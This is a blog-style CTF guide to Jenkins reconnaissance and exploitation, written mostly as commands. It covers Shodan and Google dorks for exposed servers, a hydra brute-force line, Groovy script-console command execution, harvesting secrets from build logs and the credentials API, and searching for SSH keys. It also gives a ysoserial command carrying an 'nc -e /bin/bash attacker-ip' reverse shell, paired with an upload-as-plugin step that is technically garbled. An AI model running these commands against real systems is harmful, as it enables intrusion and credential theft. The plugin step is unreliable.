---
title: "Starting Point: A Comprehensive Guide to Jenkins Reconnaissance"
date: "2025-02-03"
author: "Sumon Nath"
tags: [CTF, cybersecurity, Jenkins, reconnaissance, recon]
---

# Starting Point: A Comprehensive Guide to Jenkins Reconnaissance

Jenkins is a widely used automation server often targeted in Capture The Flag (CTF) challenges. Misconfigured Jenkins instances can lead to sensitive information disclosure, remote code execution, and privilege escalation. This guide focuses on reconnaissance techniques to assess Jenkins security.

---

## **1. Finding Jenkins Instances**

### **Identifying Jenkins via Search Engines**
Public Jenkins servers can sometimes be found via search engines like Shodan or Google Dorking:

- **Shodan Query:**
  ```
  title:"Dashboard [Jenkins]"
  ```
- **Google Dorks:**
  ```
  intitle:"Dashboard [Jenkins]"
  inurl:"/manage"
  ```

### **Scanning for Jenkins on a Target Network**
Using `nmap` to find Jenkins servers:

```bash
nmap -p 8080,8443 --open -sV target-ip
```

Look for Jenkins-specific headers:

```bash
curl -I http://target-ip:8080
```

---

## **2. Enumerating Jenkins Features**

### **Checking for Anonymous Access**
Some Jenkins instances allow unauthenticated users to access the system:

```bash
curl -s http://target-ip:8080/
```

Try accessing key paths:

- `/manage`
- `/script`
- `/job/{job-name}`

If anonymous access is enabled, you might be able to list or modify jobs.

### **Brute-Forcing Credentials**
Use common Jenkins credentials:

```bash
hydra -L users.txt -P passwords.txt target-ip http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^'
```

---

## **3. Exploiting Jenkins Misconfigurations**

### **Accessing the Script Console**
If you have admin access, the Script Console (`/script`) allows arbitrary Groovy execution:

```groovy
println "Hello from Jenkins!"
```

For command execution:

```groovy
def proc = "whoami".execute()
proc.text
```

### **Checking for Build Logs with Secrets**
Many Jenkins jobs log sensitive credentials:

```bash
curl -s http://target-ip:8080/job/test/buildNumber/consoleText
```

Look for:
- API keys
- Database credentials
- SSH keys

### **Using Malicious Plugins**
If you can upload plugins, use `ysoserial` to generate a payload:

```bash
java -jar ysoserial.jar CommonsCollections6 "nc -e /bin/bash attacker-ip 4444" > exploit.jar
```

Upload `exploit.jar` via `/pluginManager/uploadPlugin`.

---

## **4. Privilege Escalation in Jenkins**

### **Exploiting Misconfigured Credentials Storage**
Check for stored credentials via `/credentials` API:

```bash
curl -u admin:password http://target-ip:8080/credentials/
```

### **Abusing Script Approval Settings**
If the `Groovy` sandbox is disabled, execute system commands:

```groovy
def cmd = "id".execute()
cmd.text
```

### **Privilege Escalation via SSH Keys**
If Jenkins runs as a privileged user, search for SSH keys:

```bash
find / -name 'id_rsa' 2>/dev/null
```

If found, use:

```bash
ssh -i id_rsa root@target-ip
```

---

## **Conclusion**

Reconnaissance on Jenkins targets can uncover misconfigurations leading to full system compromise. By checking for public access, exploiting script consoles, and searching logs for secrets, attackers can escalate privileges within Jenkins environments. 

🚀 Keep learning and happy hacking!

---

💡 **Want more Jenkins security insights?** Stay tuned for advanced exploitation techniques!

